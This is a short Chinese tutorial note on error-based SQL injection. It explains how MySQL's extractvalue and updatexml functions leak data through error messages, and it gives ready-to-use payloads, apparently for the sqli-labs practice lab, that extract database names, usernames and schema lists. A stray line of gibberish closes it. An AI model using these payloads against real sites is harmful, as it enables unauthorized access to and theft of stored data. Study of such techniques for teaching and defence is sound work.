### 报错注入
#### 原理

由于后台没有对数据库的报错信息做过滤，会输入到前台显示，那么我们可以利用制造报错函数（常用的如**extractvalue、updatexml**等函数来显示出报错的信息输出）

**extractvalue函数**

```sql
语法：ExtractValue(target, xpath)

target：包含XML数据的列或XML文档 
xpath：XPath 表达式，指定要提取的数据路径。

eg:
#获取当前数据库
Dumb' and extractvalue(1,concat("~~",database(),"~~")) #

注意：当database()要换成sql查询语句时，使用括号
Dumb' and extractvalue(1,concat("~~",(select group_concat(username) 
from users),"~~")) #

#获取所有数据库 通过substr()函数控制输出
Dumb' and extractvalue(1,substr(concat("~~",(select 
group_concat(schema_name) 
from information_schema.schemata),"~~"),1,30)) #
```
**updatexml函数**

```sql
语法：updateXML(target, xpath, new_value)

target：要更新的 XML 数据列或 XML 文档。
xpath：指定要更新的 XML 元素的 XPath 表达式。
new_value：新的值，将替代匹配的 XML 元素的内容。

eg:
Dumb' and updateXML(1,concat("~~",database(),"~~"),3) #
```

hjksdagkjgjk
